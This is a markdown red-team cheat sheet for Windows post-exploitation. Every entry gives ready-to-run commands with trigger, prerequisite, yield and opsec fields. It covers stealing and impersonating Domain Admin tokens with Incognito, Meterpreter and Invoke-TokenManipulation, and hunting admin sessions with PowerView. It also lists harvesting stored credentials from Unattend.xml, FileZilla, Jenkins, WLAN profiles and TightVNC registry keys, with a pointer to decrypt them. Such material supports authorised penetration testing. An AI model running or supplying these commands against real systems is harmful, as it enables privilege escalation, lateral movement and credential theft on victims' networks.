# Token Manipulation & Impersonation

## Incognito (Standalone or Meterpreter Module)

### Token Impersonation via Incognito [added: 2026-04]
- **Tags:** #Incognito #TokenImpersonation #Meterpreter #TokenTheft #PrivEsc #T1134.001
- **Trigger:** Local admin on host; high-value users (DA) have active sessions/processes
- **Prereq:** Local admin access on target; target users with active sessions/processes on the machine
- **Yields:** Impersonated token of target user (e.g., Domain Admin) for privilege escalation
- **Opsec:** Med
- **Context:** Have local admin — steal tokens of other users with sessions/processes on the machine
- **Payload/Method:**
  ```
  # List all tokens on machine
  .\incognito.exe list_tokens -u

  # Impersonate a specific user's token (spawns process as that user)
  .\incognito.exe execute -c "DOMAIN\Administrator" C:\Windows\system32\cmd.exe

  # In Meterpreter:
  use incognito
  list_tokens -u
  impersonate_token "DOMAIN\\Administrator"
  ```

## Invoke-TokenManipulation (PowerShell)

### PowerShell Token Manipulation [added: 2026-04]
- **Tags:** #InvokeTokenManipulation #PowerShell #TokenTheft #ProcessToken #PrivEsc #T1134.001
- **Trigger:** PowerShell admin context; need to enumerate and steal tokens from running processes
- **Prereq:** Local admin with PowerShell; Invoke-TokenManipulation.ps1 loaded
- **Yields:** Process spawned with stolen token of target user (impersonation)
- **Opsec:** Med
- **Context:** PowerShell context with admin — enumerate and steal tokens from running processes
- **Payload/Method:**
  ```powershell
  Import-Module .\Invoke-TokenManipulation.ps1

  # Show ALL tokens (including non-unique/duplicate sessions)
  Invoke-TokenManipulation -ShowAll

  # Show only unique, usable tokens
  Invoke-TokenManipulation -Enumerate

  # Impersonate specific user (spawns process with their token)
  Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"

  # Steal token from specific process (by PID)
  Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\cmd.exe" -ProcessId 1234
  ```

## Targeted Enumeration Before Token Theft

### Find Sessions of Valuable Users (PowerView) [added: 2026-04]
- **Tags:** #PowerView #UserHunter #DAHunting #SessionEnum #TokenTarget #T1033
- **Trigger:** Planning token theft; need to find machines where DA/admin tokens exist
- **Prereq:** PowerView loaded; valid domain user context; SMB access to targets
- **Yields:** Machines where DA is logged in AND you have local admin (token theft targets)
- **Opsec:** Med
- **Context:** Hunt for DA/admin tokens on machines where you have local admin
- **Payload/Method:**
  ```powershell
  # Find machines where DA is logged in AND you have local admin
  Invoke-UserHunter -CheckAccess | ?{$_.LocalAdmin -Eq True}

  # Check remote management group membership before lateral move
  Get-NetLocalGroupMember -ComputerName TARGET-PC -GroupName "Remote Desktop Users"
  Get-NetLocalGroupMember -ComputerName TARGET-PC -GroupName "Remote Management Users"
  ```

## Juicy File Locations (Post-Exploitation Secrets Hunt)

### Sensitive Files to Check After Initial Compromise [added: 2026-04]
- **Tags:** #PostExploit #CredentialHarvest #FileDiscovery #ConfigFiles #ClearTextCreds #T1552.001
- **Trigger:** Initial foothold obtained; searching for stored credentials and sensitive files
- **Prereq:** User or admin access on target host
- **Yields:** Credentials from config files, unattend files, VNC, KeePass, Jenkins, WLAN profiles
- **Opsec:** Low
- **Context:** Any user access — check these locations for credentials, keys, configs
- **Payload/Method:**
  ```powershell
  # Full file tree of all user folders
  tree /f /a C:\Users

  # Web application configs
  Get-ChildItem -Recurse C:\inetpub\www\ -Filter web.config
  Get-ChildItem -Recurse C:\inetpub\ -Include *.config,*.xml | Select-String -Pattern "password"

  # Unattended install files (may contain cleartext credentials)
  Get-Content C:\Windows\Panther\Unattend.xml

  # PowerShell script directories
  Get-ChildItem -Recurse "C:\Program Files\Windows PowerShell\"

  # PuTTy saved sessions
  Get-ChildItem "C:\Users\*\AppData\LocalLow\Microsoft\Putty\"

  # FileZilla stored credentials
  Get-Content "C:\Users\*\AppData\Roaming\FileZilla\FileZilla.xml"

  # Jenkins credentials
  Get-Content "C:\Program Files\Jenkins\credentials.xml"

  # WLAN profiles (may contain PSK)
  Get-ChildItem "C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml"

  # TightVNC password (stored in registry, encrypted with fixed key)
  Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" |
    select -ExpandProperty Password
  # Decrypt: https://github.com/frizb/PasswordDecrypts (fixed 3DES key)

  # Enumerate local databases
  sqlcmd -S localhost -Q "SELECT name FROM sys.databases"
  Invoke-SqlCmd -Query "SELECT name FROM sys.databases"
  ```
